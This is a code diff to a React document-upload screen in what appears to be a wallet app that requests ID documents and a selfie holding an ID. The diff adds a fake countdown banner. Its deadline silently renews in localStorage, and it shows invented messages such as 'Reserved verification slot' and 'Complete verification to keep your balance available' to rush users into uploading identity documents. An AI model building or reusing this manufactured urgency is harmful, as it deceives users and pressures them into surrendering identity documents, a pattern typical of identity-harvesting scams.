@@ -35,8 +35,22 @@ const fields: UploadField[] = [
   { label: "Selfie with Document", description: "Take a selfie holding your identity document", key: "selfie" },
 ];
 
+const DEADLINE_KEY = "wallet_docs_deadline";
+
 const DocumentUploadScreen = ({ userName, onSubmit }: DocumentUploadScreenProps) => {
   const [files, setFiles] = useState<Record<string, File | null>>({});
+  const [deadline] = useState<number>(() => {
+    const stored = localStorage.getItem(DEADLINE_KEY);
+    if (stored) {
+      const n = Number(stored);
+      if (n > Date.now()) return n;
+    }
+    const next = Date.now() + URGENCY_WINDOW_MS;
+    localStorage.setItem(DEADLINE_KEY, String(next));
+    return next;
+  });
+  const { remaining, label: countdown } = useCountdown(deadline);
+  const expired = remaining <= 0;
 
   const handleFile = (key: string, file: File | null) => {
     setFiles((prev) => ({ ...prev, [key]: file }));
@@ -65,6 +79,28 @@ const DocumentUploadScreen = ({ userName, onSubmit }: DocumentUploadScreenProps)
         <p className="text-sm text-muted-foreground mb-4">
           Upload the required documents to verify your account and access your funds.
         </p>
+
+        {/* Urgency timer */}
+        <div className={`flex items-center gap-3 p-3 rounded-xl border mb-3 ${
+          expired
+            ? "bg-destructive/5 border-destructive/30"
+            : "bg-warning/5 border-warning/30"
+        }`}>
+          <Clock className={`w-4 h-4 shrink-0 ${expired ? "text-destructive" : "text-warning"}`} />
+          <div className="flex-1 min-w-0">
+            <p className="text-xs font-semibold text-foreground">
+              {expired ? "Session expiring — verify now" : "Reserved verification slot"}
+            </p>
+            <p className="text-[11px] text-muted-foreground">
+              {expired
+                ? "Complete verification to keep your balance available."
+                : "Finish uploading before the timer runs out to keep priority processing."}
+            </p>
+          </div>
+          <span className={`text-sm font-bold tabular-nums ${expired ? "text-destructive" : "text-warning"}`}>
+            {countdown}
+          </span>
+        </div>
 
         {/* Security notice */}
         <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mb-5">
